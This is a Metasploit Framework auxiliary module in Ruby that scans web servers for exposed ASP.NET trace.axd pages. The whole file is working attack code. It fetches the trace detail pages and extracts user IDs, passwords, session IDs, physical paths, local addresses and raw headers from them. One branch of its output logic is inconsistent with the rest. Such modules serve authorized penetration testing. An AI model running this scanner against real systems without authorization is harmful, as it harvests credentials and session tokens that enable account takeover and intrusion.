##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	# Exploit mixins should be called first
	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::WMAPScanDir
	# Scanner mixin should be near last
	include Msf::Auxiliary::Scanner
	include Msf::Auxiliary::Report

	def initialize
		super(
			'Name'        => 'HTTP trace.axd Content Scanner',
			'Version'     => '$Revision$',
			'Description' => 'Detect trace.axd files and analize its content',
			'Author'       => ['c4an'],
			'License'     => MSF_LICENSE
		)

		register_options(
			[
				OptString.new('PATH',  [ true,  "The test path to find trace.axd file", '/']),
				OptBool.new('TRACE_DETAILS', [ true,  "Display trace.axd details", true ])
			], self.class)

		register_advanced_options(
			[
				OptString.new('StoreFile', [ false,  "Store all information into a file", './trace_axd.log'])
			], self.class)
	end

	def run_host(target_host)
		tpath = datastore['PATH']
		if tpath[-1,1] != '/'
			tpath += '/'
		end

		begin
			turl = tpath+'trace.axd'

			res = send_request_cgi({
				'uri'          => turl,
				'method'       => 'GET',
				'version' => '1.0',
			}, 10)


			if res and res.body.include?("<td><h1>Application Trace</h1></td>")
				print_status("[#{target_host}] #{tpath}trace.axd FOUND.")

				report_note(
						:host	=> target_host,
						:proto => 'tcp',
						:sname	=> 'HTTP',
						:port	=> rport,
						:type	=> 'TRACE_AXD',
						:data	=> "trace.axd"
					)

				if datastore['TRACE_DETAILS']

					aregex = /Trace.axd\?id=\d/
					result = res.body.scan(aregex).uniq

					result.each do |u|
						turl = tpath+u.to_s

						res = send_request_cgi({
							'uri'          => turl,
							'method'       => 'GET',
							'version' => '1.0',
						}, 10)

						if res
							reg_info = [
								/<td>UserId<\/td><td>(\w+.*)<\/td>/,
								/<td>Password<\/td><td>(\w+.*)<\/td>/,
								/<td>APPL_PHYSICAL_PATH<\/td><td>(\w+.*)<\/td>/,
								/<td>AspFilterSessionId<\/td><td>(\w+.*)<\/td>/,
								/<td>Via<\/td><td>(\w+.*)<\/td>/,/<td>LOCAL_ADDR<\/td><td>(\w+.*)<\/td>/,
								/<td>ALL_RAW<\/td><td>((.+\n)+)<\/td>/
							]
							print_status ("DETAIL: #{turl}")
							reg_info.each do |reg|
								result = res.body.scan(reg).flatten.map{|s| s.strip}.uniq
								str = result.to_s.chomp


								if reg.to_s.include?"APPL_PHYSICAL_PATH"
									print_status ("Physical Path: #{str}")
								elsif reg.to_s.include?"UserId"
									print_status ("User ID: #{str}")
								elsif reg.to_s.include?"Password"
									print_status ("Password: #{str}")
								elsif reg.to_s.include?"AspFilterSessionId"
									print_status ("Session ID: #{str}")
								elsif reg.to_s.include?"LOCAL_ADDR"
									print_status ("Local Address: #{str}")
								elsif result.include?"Via"
									print_status ("VIA: #{str}")
								elsif reg.to_s.include?"ALL_RAW"
									print_status ("Headers: #{str}")
								end
							end
						end
					end
				end
			end

		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
		rescue ::Timeout::Error, ::Errno::EPIPE
		end
	end
end
